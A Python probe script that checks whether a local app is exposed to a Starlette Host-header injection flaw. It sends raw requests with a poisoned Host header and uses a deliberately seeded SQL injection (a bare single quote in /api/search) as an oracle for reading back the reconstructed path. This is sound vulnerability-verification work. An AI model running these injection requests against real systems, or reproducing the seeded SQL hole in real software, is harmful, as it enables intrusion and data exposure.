#!/usr/bin/env python3
"""Probe for PYSEC-2026-161 / CVE-2026-48710 ("BadHost") against a running instance.

The advisory: Starlette (< 1.0.1) reconstructs the request URL from the Host
header without validating it, so an attacker can inject path segments into the
host part (e.g. `Host: victim/admin`). Routing still uses the *real* path, so
`request.url.path` and the routed path disagree. That only becomes a
vulnerability if the app makes a trust decision on the reconstructed
`request.url` / `request.url.path` (auth middleware, url_for redirects, etc.).

This records-api pins starlette==0.50.0, so the flaw is *present* in the
dependency. The question this script answers empirically is twofold:

  1. Is the primitive reachable?  i.e. does uvicorn/h11 even accept a Host
     header containing "/", and does Starlette then fold the injected segment
     into request.url.path?
  2. Does anything in THIS app trust that value?  The only place the app
     surfaces request.url.path is the global 500 handler
     (app/main.py: unhandled_exception_handler), which reflects it in the JSON
     body. We use that handler as an observation oracle: the seeded SQL
     injection in /api/search (a single quote breaks the query -> 500) lets us
     read back the reconstructed path for an attacker-controlled Host.

No third-party deps: raw sockets, because requests/httpx refuse to send a Host
header with a "/" in it (which is the whole point of the attack).

Usage:
    uv run python scripts/badhost-probe.py
    uv run python scripts/badhost-probe.py --base-url http://localhost:8000
    uv run python scripts/badhost-probe.py --email alice@example.com --password alice-password

Exit codes:
    0  probe ran and reached a conclusion (read the verdict text)
    2  could not reach the target / login failed
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
from urllib.parse import urlsplit

CANARY = "badhost-canary-9f3c"


def send_raw(
    host: str,
    port: int,
    method: str,
    path: str,
    *,
    host_header: str,
    extra_headers: dict[str, str] | None = None,
    body: bytes | None = None,
    timeout: float = 5.0,
) -> tuple[int, dict[str, str], bytes]:
    """Send one HTTP/1.1 request over a raw socket with a fully controlled Host header.

    Returns (status_code, headers, body). Connection: close so we read to EOF.
    """
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host_header}", "Connection: close"]
    headers = extra_headers or {}
    for key, value in headers.items():
        lines.append(f"{key}: {value}")
    if body is not None:
        lines.append(f"Content-Length: {len(body)}")
    raw = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
    if body is not None:
        raw += body

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall(raw)
        chunks = []
        while True:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
    response = b"".join(chunks)

    head, _, payload = response.partition(b"\r\n\r\n")
    head_lines = head.split(b"\r\n")
    status_code = int(head_lines[0].split(b" ")[1]) if len(head_lines) else 0
    resp_headers: dict[str, str] = {}
    for line in head_lines[1:]:
        name, sep, value = line.partition(b":")
        if sep:
            resp_headers[name.decode("latin-1").strip().lower()] = value.decode(
                "latin-1"
            ).strip()
    return status_code, resp_headers, payload


def reflected_path(body: bytes) -> str | None:
    """Pull the 'path' field the 500 handler reflects, if present."""
    try:
        return json.loads(body.decode("utf-8", "replace")).get("path")
    except (ValueError, AttributeError):
        return None


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://localhost:8000")
    parser.add_argument("--email", default="alice@example.com")
    parser.add_argument("--password", default="alice-password")
    args = parser.parse_args()

    parts = urlsplit(args.base_url)
    host = parts.hostname or "localhost"
    port = parts.port or (443 if parts.scheme == "https" else 80)
    if parts.scheme == "https":
        print(
            "This probe speaks cleartext HTTP only; point it at the http:// listener."
        )
        return 2
    normal_host = f"{host}:{port}"

    print(f"target        {args.base_url}")
    print("advisory      PYSEC-2026-161 / CVE-2026-48710 (BadHost, starlette < 1.0.1)")
    print("-" * 72)

    # --- 0. reachability ---------------------------------------------------
    try:
        code, _, _ = send_raw(host, port, "GET", "/health", host_header=normal_host)
    except OSError as exc:
        print(f"UNREACHABLE   {exc}")
        print("Start it first, e.g.:  uv run uvicorn app.main:app --port 8000")
        return 2
    print(f"health        HTTP {code}")

    # --- 1. login ----------------------------------------------------------
    creds = json.dumps({"email": args.email, "password": args.password}).encode()
    code, _, body = send_raw(
        host,
        port,
        "POST",
        "/api/login",
        host_header=normal_host,
        extra_headers={"Content-Type": "application/json"},
        body=creds,
    )
    if code != 200:
        print(f"LOGIN FAILED  HTTP {code}: {body[:200]!r}")
        return 2
    token = json.loads(body)["access_token"]
    auth = {"Authorization": f"Bearer {token}"}
    print(f"login         HTTP 200, token acquired ({args.email})")
    print("-" * 72)

    # --- 2. oracle baseline ------------------------------------------------
    # A bare single quote breaks the seeded SQL string interpolation in
    # db.search_records -> OperationalError -> 500 handler reflects url.path.
    sqli_path = "/api/search?q=%27"
    code_b, _, body_b = send_raw(
        host, port, "GET", sqli_path, host_header=normal_host, extra_headers=auth
    )
    path_b = reflected_path(body_b)
    print(f"baseline 500  Host: {normal_host}")
    print(f"              HTTP {code_b}, reflected path = {path_b!r}")
    if code_b != 500 or path_b is None:
        print("              (expected a 500 with a reflected 'path'; the SQLi oracle")
        print("               did not fire — cannot observe reconstruction, aborting.)")
        return 0

    # --- 3. oracle under Host injection ------------------------------------
    poisoned_host = f"{normal_host}/{CANARY}"
    code_a, _, body_a = send_raw(
        host, port, "GET", sqli_path, host_header=poisoned_host, extra_headers=auth
    )
    path_a = reflected_path(body_a)
    print(f"attack   500  Host: {poisoned_host}")
    print(f"              HTTP {code_a}, reflected path = {path_a!r}")
    print("-" * 72)

    # --- 4. verdict --------------------------------------------------------
    if code_a == 400 or code_a == 0:
        print("VERDICT  NOT REACHABLE")
        print("  The server rejected the Host header containing '/' (HTTP 400 from")
        print("  h11/uvicorn) before Starlette reconstructed the URL. The injection")
        print("  primitive is not reachable through this stack as deployed.")
        return 0

    injected = path_a is not None and CANARY in path_a
    if injected:
        print("VERDICT  PRIMITIVE PRESENT — no auth bypass in THIS app")
        print(f"  The canary path segment '{CANARY}' was folded into the")
        print("  reconstructed request.url.path, confirming the BadHost primitive in")
        print("  starlette==0.50.0: url.path and the routed path disagree.")
        print("  Impact here is limited to the value reflected by the 500 handler —")
        print("  the app makes no authz/redirect decision on request.url, so this is")
        print("  not an authentication bypass. It becomes exploitable only if code is")
        print(
            "  later added that trusts request.url(.path). Fix: bump starlette>=1.0.1."
        )
    else:
        print("VERDICT  NOT EXPLOITABLE")
        print("  The Host header was accepted but the injected segment did NOT appear")
        print("  in the reconstructed request.url.path, so the reconstruction/routing")
        print("  disagreement this advisory needs is not observable here.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
